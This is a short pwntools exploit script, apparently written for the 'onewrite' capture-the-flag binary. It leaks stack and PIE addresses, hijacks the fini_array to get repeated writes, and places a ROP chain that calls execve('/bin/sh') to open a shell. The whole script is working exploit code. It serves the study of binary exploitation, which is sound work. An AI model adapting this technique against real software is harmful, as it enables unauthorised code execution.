from pwn import *

target = process('./onewrite')
elf = ELF('onewrite')
# gdb.attach(target, gdbscript='pie b *0x106f3')

def leak(opt):
    target.recvuntil('>')
    target.sendline(str(opt))
    leak = target.recvline()
    leak = int(leak, 16)
    return leak

def write(adr, val, other = 0):
    target.recvuntil('address :')
    target.send(str(adr))
    target.recvuntil('data :')
    if other == 0:
        target.send(p64(val))
    else:
        target.send(val)

stackLeak = leak(1)
ripAdr = stackLeak + 0x18
csiRipAdr = stackLeak - 72
write(ripAdr, p8(0x04), 1)
doLeakAdr = leak(2)
pieBase = doLeakAdr - elf.symbols['do_leak']
finiArrAdr = pieBase + elf.symbols['__do_global_dtors_aux_fini_array_entry']
csuFini = pieBase + elf.symbols['__libc_csu_fini']
doOverwrite = pieBase + elf.symbols['do_overwrite']
write(ripAdr, p8(0x04), 1)
leak(1)
write(finiArrAdr + 8, doOverwrite)
write(finiArrAdr, doOverwrite)
write(csiRipAdr, csuFini)
csiRipAdr += 8

popRdi = pieBase + 0x84fa
popRsi = pieBase + 0xd9f2
popRdx = pieBase + 0x484c5
popRax = pieBase + 0x460ac
syscall = pieBase + 0x917c
binshAdr = doLeakAdr + 0x2aa99b

# 0x00000000000106f3 : add rsp, 0xd0 ; pop rbx ; ret
pivotGadget = pieBase + 0x106f3
def writeQword(adr, val):
    global csiRipAdr
    write(adr, val)
    write(csiRipAdr, csuFini)
    csiRipAdr += 8

writeQword(binshAdr, u64("/bin/sh\x00"))

writeQword(stackLeak + 0xd0, popRdi)
writeQword(stackLeak + 0xd8, binshAdr)
writeQword(stackLeak + 0xe0, popRsi)
writeQword(stackLeak + 0xe8, 0)
writeQword(stackLeak + 0xf0, popRdx)
writeQword(stackLeak + 0xf8, 0)
writeQword(stackLeak + 0x100, popRax)
writeQword(stackLeak + 0x108, 59)
writeQword(stackLeak + 0x110, syscall)

write(stackLeak - 0x10, pivotGadget)
target.interactive()
